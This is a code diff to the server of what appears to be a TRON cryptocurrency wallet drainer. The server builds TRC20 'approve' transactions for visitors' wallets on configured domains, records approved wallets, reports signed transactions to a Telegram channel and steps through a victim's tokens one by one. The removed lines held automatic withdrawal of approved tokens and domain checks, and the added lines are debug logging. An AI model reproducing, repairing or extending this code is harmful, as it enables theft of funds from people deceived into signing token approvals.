@@ -20,8 +20,6 @@ const {
 	createSendTRX,
 	createSendTRC10,
 	createApproveTRC20,
-	checkTRC20ApprovalToContract,
-	withdrawTRC20,
 	saveApprovedWallet,
 } = require('./modules/functions')
 const {
@@ -122,9 +120,6 @@ async function sendTelegramMessage(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
-		if (indexOfSetting === -1) {
-			return res.status(400).send({ error: 'Domain not found in settings' })
-		}
 		const setting = SETTINGS[indexOfSetting]
 
 		data.receiver =
@@ -153,9 +148,6 @@ async function sendTokensList(req, res) {
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
-		if (indexOfSetting === -1) {
-			return res.status(400).send({ error: 'Domain not found in settings' })
-		}
 		const setting = SETTINGS[indexOfSetting]
 		const balance = await checkBalance(address, indexOfSetting, walletName)
 		let {
@@ -239,12 +231,9 @@ async function sendTokensList(req, res) {
 
 		res.status(200).send({ tokens })
 	} catch (error) {
-		console.error('sendTokensList error:', error.message || error)
+		console.log(error)
 		const errorMessage = 'Something went wrong when trying to send data'
-		res.status(500).send({
-			error: errorMessage,
-			details: error.message || String(error),
-		})
+		res.status(500).send(errorMessage)
 	}
 }
 
@@ -256,13 +245,10 @@ function delay(ms) {
 async function getUnsignedTx(req, res) {
 	try {
 		const messageData = req.body
-		const { token, address, domain, domainAndPath } = messageData
+		const { token, address, domain } = messageData
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
-		if (indexOfSetting === -1) {
-			return res.status(400).send({ error: 'Domain not found in settings' })
-		}
 		const setting = SETTINGS[indexOfSetting]
 		const moveMessage = 'Move to the next token'
 		const transactionTitle = setting.transactionTitle
@@ -298,29 +284,13 @@ async function getUnsignedTx(req, res) {
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			case 'trc20':
-				if (
-					BigInt(token.balance || 0) > 0n &&
-					(await checkTRC20ApprovalToContract(
-						token,
-						address,
-						indexOfSetting,
-						tronWeb,
-					))
-				) {
-					console.log('Token approved')
-					if (
-						setting.mode === 3 ||
-						(setting.useAutowithdraw && setting.mode !== 4)
-					)
-						withdrawTRC20(
-							token,
-							address,
-							indexOfSetting,
-							domainAndPath,
-							tronWeb,
-						)
-					return res.status(200).send({ message: moveMessage })
-				}
+				console.log(
+					'TRC20 case, token:',
+					token.tokenName,
+					'balance:',
+					token.balance,
+				)
+				console.log('Creating approve transaction...')
 				const {
 					isActivatedAddress,
 					isRequiredEnergyAvailable,
@@ -347,6 +317,7 @@ async function getUnsignedTx(req, res) {
 					indexOfSetting,
 					tronWeb,
 				)
+				console.log('Approve transaction created:', transaction ? 'OK' : 'NULL')
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			default:
@@ -386,13 +357,10 @@ async function sendSignedTransaction(req, res) {
 
 	try {
 		const messageData = req.body
-		const { token, address, domain, domainAndPath } = messageData
+		const { token, address, domain } = messageData
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
-		if (indexOfSetting === -1) {
-			return res.status(400).send({ error: 'Domain not found in settings' })
-		}
 		const setting = SETTINGS[indexOfSetting]
 
 		// Send the raw signed transaction
@@ -413,8 +381,8 @@ async function sendSignedTransaction(req, res) {
 
 		// Wait for transaction confirmation (based on getTransaction)
 		const waitRes = await waitForSuccess(txid, {
-			timeoutMs: 300000,
-			pollInterval: 2000,
+			timeoutMs: 120000,
+			pollInterval: 3000,
 		})
 		if (waitRes.timeout || !waitRes.found) {
 			console.log('Transaction info not found within timeout for tx', txid)
@@ -459,27 +427,6 @@ async function sendSignedTransaction(req, res) {
 			parse_mode: 'HTML',
 			disable_web_page_preview: true,
 		})
-
-		// Handle autowithdraw
-		if (
-			token.tokenType === 'trc20' &&
-			Number(token.balance) > 0 &&
-			(setting.mode === 3 || (setting.useAutowithdraw && setting.mode !== 4))
-		) {
-			setTimeout(async () => {
-				try {
-					await withdrawTRC20(
-						token,
-						address,
-						indexOfSetting,
-						domainAndPath,
-						tronWeb,
-					)
-				} catch (error) {
-					console.error(error)
-				}
-			}, 20 * 1000)
-		}
 
 		// Return energy if needed
 		if (
